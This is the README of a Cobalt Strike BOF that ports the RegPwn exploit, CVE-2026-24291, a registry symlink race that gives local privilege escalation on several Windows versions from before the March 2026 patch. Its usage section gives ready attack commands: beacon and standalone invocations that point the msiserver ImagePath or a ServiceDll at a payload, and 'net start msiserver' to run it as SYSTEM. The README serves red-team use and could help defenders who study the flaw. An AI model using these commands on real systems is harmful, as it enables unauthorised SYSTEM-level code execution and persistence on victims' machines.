# RegPwn BOF

Cobalt Strike BOF port of the [RegPwn](https://github.com/mdsecactivebreach/RegPwn) exploit by **Filip Dragovic** ([@Wh04m1001](https://github.com/Wh04m1001)) / **MDSec ActiveBreach**.

This is a sloppy BOF reimplementation of the original C# exploit. All credit for the vulnerability research and exploit goes to Filip Dragovic and MDSec.

- **Blog post**: https://www.mdsec.co.uk/2026/03/rip-regpwn/
- **Original repo**: https://github.com/mdsecactivebreach/RegPwn
- **CVE**: CVE-2026-24291

## What it does

Exploits a registry symlink race condition in the Windows Accessibility ATConfig mechanism to write arbitrary values to protected HKLM registry keys from a normal user context (Local Privilege Escalation).

Targets Windows 11 25H2/24H2, Windows 10 21H2, and Windows Server 2016/2019/2022 **prior to the March 2026 patch**.

**WARNING**: This exploit locks the workstation as part of the race condition.

## Default target

The `msiserver` (Windows Installer) service `ImagePath`. This service runs as SYSTEM and can be started by normal users.

## Usage

### Cobalt Strike

Load `regpwn.cna` in Script Manager, then:

```
beacon> regpwn "cmd.exe /c C:\Programdata\payload.exe"
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
```

### Standalone test

```
regpwn.x64.exe "cmd.exe /c C:\Programdata\payload.exe"
regpwn.x64.exe C:\payload.exe SYSTEM\CurrentControlSet\Services\OtherService ImagePath
```

After the exploit succeeds, start the service to execute as SYSTEM:
```
net start msiserver
```

## Build

Requires `x86_64-w64-mingw32-gcc` (MinGW-w64 cross compiler).

```
make        # build BOF (regpwn.x64.o)
make test   # build standalone EXE (regpwn.x64.exe)
make clean
```

x64 only.
